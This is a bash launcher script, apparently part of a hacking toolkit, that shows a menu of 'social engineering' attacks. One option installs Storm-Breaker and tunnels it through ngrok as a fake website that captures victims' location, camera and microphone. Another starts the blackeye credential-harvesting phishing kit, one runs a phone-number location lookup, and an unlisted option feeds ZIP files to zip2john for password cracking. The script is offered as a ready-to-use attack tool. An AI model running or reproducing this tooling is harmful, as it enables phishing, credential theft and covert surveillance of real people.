#! /bin/bash

echo "                               .@@@@@@@@@@@@@@@@%                               
                              @@@@@@@@@@@@@@@@@@@@*                             
                 .#.          @@@@(           @@@@@          @@.                
               @@@@@@@%      (@@@@            (@@@@      ,@@@@@@@@              
            (@@@@@@@@@@@@@   @@@@@             @@@@(  (@@@@@@@@@@@@@,           
          @@@@@@(    *@@@@@@@@@@@*             @@@@@@@@@@@&     &@@@@@@         
       (@@@@@@           @@@@@&.                 *@@@@@(          .@@@@@@*      
     %@@@@@(                                                         &@@@@@     
      @@@@@@                  .@@@@@@@@@@@@@@@@@@#                  (@@@@@.     
        @@@@@@            .@@@@@@@@@@&%%#%%@@@@@@@@@@%            *@@@@@/       
          @@@@@@        &@@@@@@/                 %@@@@@@/       .@@@@@(         
           .@@@@@     @@@@@@.        ./%&#*         #@@@@@/     @@@@@           
 ,%@@@@@@@@@@@@&    .@@@@@        @@@@@@@@@@@@&       (@@@@@     @@@@@@@@@@@@@# 
@@@@@@@@@@@@@@*    ,@@@@%       @@@@@@,   (@@@@@*       @@@@@     #@@@@@@@@@@@@@
@@@@@              @@@@@       /@@@@        #@@@@        @@@@%              @@@@
@@@@@             (@@@@.       /@@@@        %@@@@        (@@@@              @@@@
@@@@@             #@@@@         @@@@@@*   #@@@@@,        *@@@@.             @@@@
@@@@@             /@@@@.         &@@@@@@@@@@@@@(         #@@@@              @@@@
@@@@@              @@@@@      @@@@@@@@@&%&@@@@@@@@%      @@@@#              @@@@
@@@@@@@@@@@@@@%    .@@@@@   @@@@@@.           /@@@@@#   @@@@@     @@@@@@@@@@@@@@
  ,/#@@@@@@@@@@@     @@@@@,@@@@@                ,@@@@@&@@@@@     @@@@@@@@@@&(*. 
            @@@@@     #@@@@@@@@                  *@@@@@@@@      @@@@@           
          @@@@@&        /@@@@@@@.               /@@@@@@@         @@@@@@         
        @@@@@&             #@@@@@@@@@@@@@@@@@@@@@@@@@,             @@@@@@       
      @@@@@@                   ,@@@@@@@@@@@@@@@@%.                   @@@@@&     
     .@@@@@@                                                         @@@@@@     
        @@@@@@/         *@@@@@@&                ,&@@@@@@.         %@@@@@@       
          #@@@@@@    %@@@@@@@@@@@/             @@@@@@@@@@@@#    @@@@@@*         
             @@@@@@@@@@@@&   @@@@@            .@@@@/   &@@@@@@@@@@@@            
               #@@@@@@*      /@@@@.           #@@@@       (@@@@@@*              
                              @@@@#           @@@@&                             
                              %@@@@@@@@@@@@@@@@@@@,                             
"
echo "You choose the social engineering section, select an attack down below"
echo "/\/\/\/\/\/\/\/\/\/\/\/\/"
echo "Fake Website that grabs Location/Camera/Microphone(1)"
echo "-------------------------"
echo "Find Phone number location and service(2)"
echo "-------------------------"
echo "Credential Harvesting sites(3)"
echo "-------------------------"









read SOCATTACK

if [[ $SOCATTACK == '1' ]]
then
    clear
    echo "This attack will use Storm-Breaker and ngrok to create a fake website, please install ngrok from their site and create an account, once you do copy your authentication token"
    echo 
    echo "Please enter ngrok's location, ex: *~/Downloads/ngrok-v3-stable-linux-amd64.tgz "
    echo "Please enter your ngrok's authentication command"
    read NLOC
    read AUTH
    echo "Sit back, relax and let the script do the rest for you, once it's done, you can visit your ngrok site (NAME AND PASSWORD ARE: admin) and then copy a fake site link"
    sleep 5
    cd Storm-breaker/
    sudo apt install python3-requests python3-colorama python3-psutil
    ./install.sh
    bash install.sh
    clear
    sudo tar xvzf $NLOC -C /usr/local/bin
    python3 st.py
    
    clear
    ngrok http 2525    

fi


if [[ $SOCATTACK == '2' ]]
then
  cd phonenumb/
  clear
  python3 main.py

fi


if [[ $SOCATTACK == '3' ]]
then
  echo "created by ErickSonAtHome on github"
  cd blackeye/
  konsole -e bash blackeye.sh
fi


if [[ $SOCATTACK == '4' ]]
then
  echo "This will crack ZIP files using john the ripper"
  echo "Enter ZIP file location"
  read ZIPLOC
  echo "Enter ZIP file name"
  read ZIPNAME
  cd $ZIPLOC
  zip2john $ZIPNAME
  
fi
